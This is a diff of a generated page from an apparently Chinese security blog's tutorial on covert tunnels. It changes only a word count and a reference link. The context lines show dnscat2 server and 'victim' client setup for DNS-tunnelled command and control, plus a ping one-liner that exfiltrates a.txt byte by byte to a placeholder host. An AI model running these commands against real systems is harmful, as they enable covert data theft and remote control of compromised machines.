@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      976 字
+      975 字
     </span>
   
 
@@ -242,7 +242,7 @@
 <p>2.dnscat2、dns2tcp</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">攻击机（server）：<br>安装<br>apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">ruby</span> <span class="hljs-keyword">ruby</span>-dev git <span class="hljs-keyword">make</span> g++ rubygems<br>gem <span class="hljs-keyword">update</span> --<span class="hljs-built_in">system</span><br>gem install bundler<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/server<br>bundle install<br>设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址，运行<br><span class="hljs-keyword">ruby</span> ./dnscat2.rb dns.uuzdaisuki.<span class="hljs-keyword">com</span> --<span class="hljs-keyword">no</span>-cache<br><br>受害者（linux）安装<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iagox86/dnscat2.git<br><span class="hljs-keyword">cd</span> dnscat2/client/<br><span class="hljs-keyword">make</span><br>受害者（windows）安装<br>http<span class="hljs-variable">s:</span>//downloads.skullsecurity.org/dnscat2/ 下载win32.zip的dnascat2后解压<br><br>将server中产生的secret复制下来，运行<br>./dnscat --dns domain=dns.uuzdaisuki.<span class="hljs-keyword">com</span> --secret=xxxxxxxxxxxxxxxxxxxxx<br>session -i <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 <p>详情参考：</p>
-<p><a target="_blank" rel="noopener" href="http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/">http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</a></p>
+<p><a target="_blank" rel="noopener" href="http://uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/">http://uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</a></p>
 <h2 id="ping隧道"><a href="#ping隧道" class="headerlink" title="ping隧道"></a>ping隧道</h2><p>1.命令行</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> a.txt | xxd -p -c <span class="hljs-number">1</span>|xargs -n <span class="hljs-number">1</span> -I &#x27;&#123;&#125;&#x27; ping -c <span class="hljs-number">1</span> -s <span class="hljs-number">56</span> -p &#x27;&#123;&#125;&#x27; xx.xx.xx.xx<br></code></pre></td></tr></table></figure>
 <p>2.pingtunnel</p>
